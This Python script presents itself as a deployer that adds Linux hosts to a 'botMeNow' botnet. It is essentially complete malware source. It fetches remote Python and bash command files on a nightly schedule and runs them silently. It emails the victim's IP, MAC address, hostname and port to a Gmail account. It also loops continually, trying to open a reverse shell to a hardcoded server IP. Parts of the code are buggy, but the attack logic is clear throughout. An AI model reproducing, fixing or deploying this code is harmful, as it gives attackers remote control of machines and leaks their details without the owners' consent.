#This python file deploys everything neccessary to add a linux host to the botMeNow botnet
import time
import os
import shutil
import urllib
import filecmp
import subprocess
from uuid import getnode as get_mac
import socket
import smtplib

global_port = 0
Serv_IP= "111.111.111.111"

def botMeNow():
    if not (os.path.isdir("/etc/botMeNow")):
        os.mkdir("/etc/botMeNow")                                   #create botmenow dir

    if not (os.path.isdir("/etc/botMeNow/prev")):
        os.mkdir("/etc/botMeNow/prev")                             #create prev dir

    shutil.copy2('/etc/botMeNow/pycom.py', '/etc/botMeNow/prev')   #put py cmd into prev
    shutil.copy2('/etc/botMeNow/bashcom.sh', '/etc/botMeNow/prev') #put bash cmd into prev

    urllib.urlretrieve("dropbox.com/pycomlocation") #downloads python commands
    urllib.urlretrieve("dropbox.com/bashcom.sh")    #downloads bash commands

    if not (filecmp.cmp('pycom.py','/prev/pycom.py')):
        py_com_str = "python pycom.py"
        subprocess.call([py_com_str], stdout=open(os.devnull, 'wb'))

    if not (filecmp.cmp('bashcom.sh', '/prev/bashcom.sh')):
        bash_com_str = "bash bashcom.sh"
        subprocess.call([bash_com_str], stdout=open(os.devnull, 'wb'))

    mac = get_mac()
    mac=':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))

    port = hashMacToPort(mac)
    global_port = port
    host = socket.gethostname()
    ip = myIp()
    sendMail(host, ip, mac, port)


    return



def openRevShell(port,ServerIP):
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect((ServerIP, port))
    os.dup2(soc.fileno(), 0)
    os.dup2(soc.fileno(), 1)
    os.dup2(soc.fileno(), 2)

    return



def hashMacToPort(mac):
    port_temp = 0
    m = mac[0:2]
    i = int(m, 16)
    port_temp += i
    m = mac[3:5]
    i = int(m, 16)
    port_temp += i
    m = mac[6:8]
    i = int(m, 16)
    port_temp += i
    m = mac[9:11]
    i = int(m, 16)
    port_temp += i
    m = mac[12:14]
    i = int(m, 16)
    port_temp += i
    m = mac[15:17]
    i = int(m, 16)
    port_temp += i
    return port_temp

def myIp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('192.0.0.8', 1027))
    except socket.error:
        return None
    return s.getsockname()[0]

def sendMail(host, ip, mac, port):
    fromaddr = 'user_me@gmail.com'
    toaddrs = 'user_you@gmail.com'
    SUBJECT = "ip-mac-port"
    TEXT = ("IP:%s MAC:%s port %s hostname: %s" % (ip, mac, port, host))
    msg= """From: %s\nTo: %s\nSubject: %s\n\n%s
    """ % (fromaddr, ", ".join(toaddrs), SUBJECT, TEXT)
    username = 'user_me@gmail.com'
    password = 'pwd'
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(username, password)
    server.sendmail(fromaddr, toaddrs, msg)
    server.quit()
    return

while True:
    cur_time = time.localtime()
    if (cur_time.tm_hour == 1 and cur_time.tm_min == 0):
        botMeNow()  # run botMeNow function at 1:00am
        time.sleep(60)

    try:
        openRevShell(global_port, Serv_IP)
    except:
            continue
